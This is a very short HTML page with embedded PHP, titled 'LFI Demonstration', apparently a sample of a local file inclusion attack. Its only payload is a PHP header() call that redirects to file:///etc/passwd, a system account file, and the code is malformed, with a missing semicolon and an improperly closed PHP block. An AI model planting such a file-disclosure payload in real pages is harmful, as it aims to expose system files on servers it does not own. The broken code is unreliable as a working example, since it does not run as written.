<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LFI Demonstration</title>
</head>
<body>
    <h1>Report</h1>
    <p>This is a sample report that embeds a sensitive file.</p>
    <?php

        header('location:file:///etc/passwd')

        >
    
</body>
</html>
